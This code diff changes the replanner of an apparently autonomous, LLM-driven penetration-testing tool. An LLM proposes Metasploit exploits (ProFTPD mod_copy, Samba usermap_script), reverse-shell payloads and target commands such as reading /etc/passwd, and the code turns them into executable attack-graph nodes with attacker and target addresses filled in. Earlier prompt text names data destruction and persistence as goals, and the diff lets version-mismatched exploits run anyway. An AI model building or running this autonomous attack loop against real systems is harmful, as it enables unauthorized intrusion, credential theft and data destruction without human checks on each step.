@@ -955,114 +955,162 @@ def _try_replanner(
 
 REPLAN_PROMPT = """You are an attack graph replanner for an autonomous penetration testing system.
 
-You are STUCK at a specific node. The outgoing edges failed their checks, so the
-pre-defined path is blocked. Your job: find an ALTERNATIVE WAY to achieve the
-NEXT GOAL in the chain.
+You are STUCK at a specific node. The pre-planned path is blocked. Your job:
+propose the SMALLEST POSSIBLE INTENT for the next step.
 
-You will receive:
-- OBJECTIVE: the overall attack goal
-- STUCK AT: the node you're at, with its findings (what you have)
-- FAILED EDGES: the edges that failed, with the TARGET NODE'S GOAL
-  (this is what you need to achieve, but differently)
-- REMAINING NODES: unreached nodes and their goals
+DO NOT emit full module options, payload params, or command parameter dicts.
+The system will fill in RHOSTS/LHOST/LPORT/RPORT defaults from graph context.
+Just tell us WHAT to try next.
 
-Your job: achieve the FAILED TARGET'S GOAL using what you have.
+You will receive: objective, target IP, attacker IP, detected services,
+recent command output, failed edges, and remaining unreached nodes.
 
-For example:
-- Failed edge target had goal "Maintain persistent access" but needed meterpreter
-  → Propose a cron job or SSH key instead (same goal, different method)
-- Failed edge target had goal "Destroy data" but needed root
-  → Propose a privesc step first, then connect to the data destruction node
+RESPOND WITH EXACTLY ONE of these JSON shapes:
 
-Propose ONE of:
-1. A new edge to an EXISTING remaining node (if your findings satisfy its needs)
-2. A NEW NODE that achieves the failed target's goal differently
+1) Use an MSF module (system fills RHOSTS/LHOST/LPORT/RPORT defaults):
+   {"action": "use_module",
+    "target_hint": "exploit/unix/ftp/proftpd_modcopy_exec",
+    "label": "ProFTPD modcopy RCE",
+    "goal": "Get shell via FTP",
+    "rationale": "ProFTPD 1.3.5 on port 21 -- known mod_copy RCE"}
 
-RESPOND IN JSON ONLY:
-```json
-{
-  "action": "new_edge",
-  "target": "existing_node_id",
-  "rationale": "why this connection works with what I have"
-}
-```
-OR for a new MSF exploit module:
-```json
-{
-  "action": "new_node",
-  "id": "new_node_id",
-  "label": "Human readable label",
-  "goal": "same goal as the failed target, or a bridging goal",
-  "agent_type": "exploit",
-  "objective": "specific plan",
-  "tool_name": "metasploit",
-  "module": "exploit/unix/ftp/proftpd_modcopy_exec",
-  "module_options": {"RHOSTS": "...", "RPORT": 21, "SITEPATH": "/var/www"},
-  "module_options_alternatives": {
-    "SITEPATH": ["/var/www/html", "/var/tmp", "/srv/www"],
-    "PAYLOAD": ["cmd/unix/reverse_python", "cmd/unix/reverse_bash"]
-  },
-  "payload": "cmd/unix/reverse_perl",
-  "payload_options": {"LHOST": "...", "LPORT": 4444},
-  "rationale": "why this works"
-}
-```
-NOTE: `module_options_alternatives` lists alternate values to try on retries.
-Include this for fields that are commonly wrong (SITEPATH, PAYLOAD, TARGETURI, etc.).
-The first attempt uses module_options as-is; retry N uses alts[N-1] for each field.
-OR for shell commands on the target via existing session:
-```json
-{
-  "action": "new_node",
-  "id": "new_node_id",
-  "label": "Human readable label",
-  "goal": "same goal as the failed target, or a bridging goal",
-  "agent_type": "impact",
-  "objective": "specific plan",
-  "tool_name": "session",
-  "commands_to_run": [
-    "echo '{marker}' > {target_file}",
-    "cat {target_file}"
-  ],
-  "command_params": {"target_file": "/tmp/pwned.txt", "marker": "PWNED"},
-  "command_params_alternatives": {
-    "target_file": ["/tmp/.proof", "/var/tmp/owned.txt"]
-  },
-  "rationale": "why this works"
-}
-```
-NOTE: For bash/session commands, use `{name}` placeholders inside commands_to_run
-and put the values in `command_params`. Only put TWEAKABLE behavior knobs in
-`command_params_alternatives` — fixed paths/identities stay in `command_params`.
-OR if no viable path exists:
-```json
-{
-  "action": "give_up",
-  "reason": "why there's no path forward"
-}
-```
+2) Run shell/session commands (newline-separated if multiple):
+   {"action": "run_commands",
+    "target_hint": "id\\ncat /etc/passwd",
+    "label": "Read passwd",
+    "goal": "Confirm root + dump users",
+    "rationale": "Session is open; verify access before pivoting"}
+
+3) Connect to an existing unreached node:
+   {"action": "new_edge",
+    "target_hint": "<existing_node_id>",
+    "rationale": "current findings satisfy that node's preconditions"}
+
+4) Give up:
+   {"action": "give_up",
+    "rationale": "..."}
 
 Rules:
-- FOCUS ON THE GOAL of the failed target node — achieve it differently
-- If the failed target's goal is far from the final objective, bridge toward it
-- If you can skip intermediate goals and jump closer to the objective, DO IT
-- Do NOT propose connecting to nodes marked as FAILED — they already tried and failed
-- If you already proposed an edge that didn't work, propose something DIFFERENT
-- DIVERSIFY across replans: if FTP didn't work, try Samba, IRC, HTTP, etc.
-  Each replan should try a SUBSTANTIALLY different attack vector, not the same
-  exploit with different params (within-node retries already handle param tweaks).
-- Prefer creating NEW NODES with specific commands over reusing failed nodes
-- For MSF modules: ALWAYS use the actual ATTACKER IP from the context for LHOST,
-  and the actual TARGET IP for RHOSTS. NEVER use placeholders like "..." or "<ip>".
-- VERSION COMPATIBILITY IS CRITICAL. Look at the recon findings (services + versions)
-  in the stuck node's findings. Only propose exploits that match the ACTUAL detected
-  versions. Common mistakes to avoid:
-    * proftpd_133c_backdoor only works on ProFTPD 1.3.3c — NOT 1.3.5
-    * samba/usermap_script only works on Samba 3.0.20-3.0.25 — NOT Samba 4.x
-    * is_known_pipename works on Samba 3.5.0-4.6.4 — NOT older
-  Your proposal will be REJECTED if the version doesn't match.
-- ONE proposal per call. Keep it concrete and actionable.
+- For use_module: target_hint is JUST the module path. Don't include options.
+- For run_commands: target_hint is the literal command(s). The system picks
+  session vs. SSH based on whether an active session exists.
+- For new_edge: target_hint must be a PENDING/BLOCKED node id (NOT FAILED).
+- *** NEVER propose a module path or command that already appears in the
+    FAILED entries of REMAINING NODES. *** Read those entries' `module` and
+    `commands_to_run` fields carefully -- if it's there, it already failed.
+- DIVERSIFY across replans: if FTP didn't work, try Samba / IRC / HTTP / etc.
+  Each replan should try a SUBSTANTIALLY different vector.
+- Match exploits to the DETECTED SERVICES versions you see in the context.
+  Note: version mismatches are warnings, not rejections -- they can still run.
+- ONE proposal per call. Concrete. No placeholders like "..." or "<ip>".
 """
+
+
+# Common-service → default port table. Used by _guess_rport_from_module
+# to fill RPORT when the LLM doesn't include it.
+_MODULE_DEFAULT_PORTS: list[tuple[str, int]] = [
+    ("proftpd", 21), ("vsftpd", 21), ("/ftp/", 21),
+    ("/ssh/", 22),
+    ("/smtp/", 25),
+    ("/dns/", 53),
+    ("/http/", 80), ("rails", 80), ("drupal", 80), ("wordpress", 80),
+    ("/pop3/", 110),
+    ("/imap/", 143),
+    ("/https/", 443),
+    ("samba", 445), ("smb", 445), ("netbios", 445),
+    ("mysql", 3306),
+    ("postgres", 5432),
+    ("/vnc/", 5900),
+    ("unreal_ircd", 6667), ("/irc/", 6667),
+    ("/rmi/", 1099),
+]
+
+
+def _guess_rport_from_module(module: str) -> Optional[int]:
+    """Heuristic: infer the typical target port from common MSF module name patterns."""
+    m = module.lower()
+    for needle, port in _MODULE_DEFAULT_PORTS:
+        if needle in m:
+            return port
+    return None
+
+
+def _expand_intent_to_node(
+    intent: dict, graph: AttackGraph, stuck_node: AttackNode,
+) -> Optional[AttackNode]:
+    """
+    Expand a tiny LLM intent into a full AttackNode.
+
+    The LLM emits {action, target_hint, label?, goal?, rationale}.
+    This helper fills in agent_type, tool_name, target_ip, module_options
+    (RHOSTS, RPORT) and payload_options (LHOST, LPORT) from graph context.
+
+    Returns None for malformed or unsupported intents.
+    """
+    action = intent.get("action", "")
+    target_hint = (intent.get("target_hint") or "").strip()
+    if not target_hint:
+        return None
+
+    # Build a sanitized, unique node id from the target_hint
+    raw = target_hint.rsplit("/", 1)[-1].split("\n", 1)[0].split()[0][:40]
+    raw = "".join(c if c.isalnum() else "_" for c in raw).strip("_") or "replan_node"
+    nid = raw
+    suffix = 1
+    while nid in graph.nodes:
+        suffix += 1
+        nid = f"{raw}_{suffix}"
+
+    has_session = any(
+        n.findings.get("session_id")
+        for n in graph.nodes.values()
+        if n.status == NodeStatus.SUCCESS.value
+    )
+
+    label = (intent.get("label") or f"Replan: {target_hint[:60]}").strip()
+    goal = (intent.get("goal") or "Continue toward objective via replanner").strip()
+
+    if action == "use_module":
+        module_options = {"RHOSTS": graph.target_ip}
+        rport = _guess_rport_from_module(target_hint)
+        if rport:
+            module_options["RPORT"] = rport
+        payload_options = {"LHOST": graph.attacker_ip, "LPORT": 4444}
+        return AttackNode(
+            id=nid,
+            label=label,
+            goal=goal,
+            agent_type="exploit",
+            objective=f"Run {target_hint} against {graph.target_ip}",
+            target_ip=graph.target_ip,
+            tool_name="metasploit",
+            module=target_hint,
+            module_options=module_options,
+            payload_options=payload_options,
+            max_retries=3,
+            tags=["replanner_generated", "intent_expanded"],
+        )
+
+    if action == "run_commands":
+        commands = [c.strip() for c in target_hint.split("\n") if c.strip()]
+        if not commands:
+            return None
+        tool_name = "session" if has_session else "ssh"
+        agent_type = "impact" if has_session else "discovery"
+        return AttackNode(
+            id=nid,
+            label=label,
+            goal=goal,
+            agent_type=agent_type,
+            objective=f"Run shell commands toward: {goal}",
+            target_ip=graph.target_ip,
+            tool_name=tool_name,
+            commands_to_run=commands,
+            max_retries=2,
+            tags=["replanner_generated", "intent_expanded"],
+        )
+
+    return None  # Unsupported action
 
 
 def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger) -> Optional[str]:
@@ -1103,7 +1151,9 @@ def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger) ->
                 "rationale": edge.rationale,
             })
 
-    # Remaining unreached nodes — include goals and failure info
+    # Remaining unreached nodes — include goals and failure info.
+    # For FAILED nodes, also include the module/command summary so the LLM
+    # can see what was actually tried (and avoid proposing the same thing).
     remaining = {}
     for nid, node in graph.nodes.items():
         if node.status in (NodeStatus.PENDING.value, NodeStatus.BLOCKED.value):
@@ -1118,7 +1168,9 @@ def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger) ->
             remaining[nid] = {
                 "label": node.label,
                 "goal": node.goal,
-                "status": "FAILED — DO NOT connect to this node, it already failed",
+                "status": "FAILED — DO NOT propose this same approach again",
+                "module": node.module,                          # what was tried
+                "commands_to_run": node.commands_to_run[:3],    # first 3 cmds
                 "failure_reason": node.metadata.get("last_failure_reason", "unknown"),
             }
 
@@ -1193,65 +1245,73 @@ def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger) ->
         log.info(f"[Replanner] NEW EDGE: {stuck_node_id} → {target_id} — {rationale}")
         return target_id
 
-    elif action == "new_node":
-        nid = result.get("id", "")
-        if not nid or nid in graph.nodes:
-            log.warning(f"[Replanner] Invalid new node ID: '{nid}'")
+    elif action in ("use_module", "run_commands"):
+        # New tiny-intent path: LLM emits {action, target_hint, label?, goal?}.
+        # We expand to a full AttackNode here using graph context defaults.
+        new_node = _expand_intent_to_node(result, graph, stuck_node)
+        if not new_node:
+            log.warning(
+                f"[Replanner] Could not expand intent (action={action}, "
+                f"target_hint={result.get('target_hint', '')!r})"
+            )
             return None
 
-        proposed_module = result.get("module", "")
-        edge_checks = []
+        # Anti-repetition guard: reject if THIS EXACT module (or command set)
+        # already failed in a prior node. This is rejection-by-observed-failure,
+        # not speculative — Stage 1's loosening was about heuristic version
+        # rejection, this is "you literally tried this and it didn't work".
+        if new_node.module:
+            failed_with_same_module = [
+                n.id for n in graph.nodes.values()
+                if n.status == NodeStatus.FAILED.value and n.module == new_node.module
+            ]
+            if failed_with_same_module:
+                log.warning(
+                    f"[Replanner] REJECTED {new_node.module}: already tried "
+                    f"and failed in {failed_with_same_module}"
+                )
+                return None
+        elif new_node.commands_to_run:
+            new_cmds_key = tuple(new_node.commands_to_run)
+            failed_with_same_cmds = [
+                n.id for n in graph.nodes.values()
+                if n.status == NodeStatus.FAILED.value
+                and tuple(n.commands_to_run) == new_cmds_key
+            ]
+            if failed_with_same_cmds:
+                log.warning(
+                    f"[Replanner] REJECTED identical command set: already tried "
+                    f"and failed in {failed_with_same_cmds}"
+                )
+                return None
 
-        # ADVISORY VALIDATION: if it's an MSF module, log a version-mismatch
-        # warning but do NOT reject. Failure is signal — let the proposal run
-        # and fail naturally; the failure output then feeds the next replan.
-        # We also do NOT persist the requirement as a hard EdgeCheck.
-        if proposed_module:
+        # ADVISORY VALIDATION (Stage 1): warn if the module doesn't match recon,
+        # but don't reject. Failure is signal — let it run and fail naturally.
+        if new_node.module:
             recon_findings = _gather_recon_findings(graph)
             ok, reason = _validate_msf_module_for_target(
-                proposed_module, recon_findings, log,
+                new_node.module, recon_findings, log,
             )
             if not ok:
                 log.warning(
-                    f"[Replanner] ADVISORY mismatch for {proposed_module}: "
-                    f"{reason} — allowing anyway"
+                    f"[Replanner] ADVISORY mismatch for {new_node.module}: "
+                    f"{reason} -- allowing anyway"
                 )
             else:
                 log.info(f"[Replanner] Module validation OK: {reason}")
 
-        new_node = AttackNode(
-            id=nid,
-            label=result.get("label", nid),
-            goal=result.get("goal", ""),
-            agent_type=result.get("agent_type", "impact"),
-            objective=result.get("objective", ""),
-            target_ip=graph.target_ip,
-            tool_name=result.get("tool_name", "session"),
-            module=proposed_module,
-            module_options=result.get("module_options", {}),
-            module_options_alternatives=result.get("module_options_alternatives", {}),
-            payload=result.get("payload", ""),
-            payload_options=result.get("payload_options", {}),
-            commands_to_run=result.get("commands_to_run", []),
-            command_params=result.get("command_params", {}),
-            command_params_alternatives=result.get("command_params_alternatives", {}),
-            max_retries=3,
-            tags=["replanner_generated"],
-        )
         graph.add_node(new_node)
         graph.connect(
-            stuck_node_id, nid,
-            checks=edge_checks,
+            stuck_node_id, new_node.id,
             evidence=f"Replanner: new step from {stuck_node_id}",
             rationale=rationale,
             condition="on_success",
         )
-        log.info(f"[Replanner] NEW NODE: {nid} ({new_node.label})")
-        log.info(f"[Replanner] NEW EDGE: {stuck_node_id} → {nid} — {rationale}")
-        if edge_checks:
-            for c in edge_checks:
-                log.info(f"  ? {c}")
-        return nid
+        log.info(f"[Replanner] NEW NODE: {new_node.id} ({new_node.label})")
+        log.info(
+            f"[Replanner] NEW EDGE: {stuck_node_id} → {new_node.id} -- {rationale}"
+        )
+        return new_node.id
 
     elif action == "give_up":
         log.warning(f"[Replanner] Gave up: {result.get('reason', '?')}")
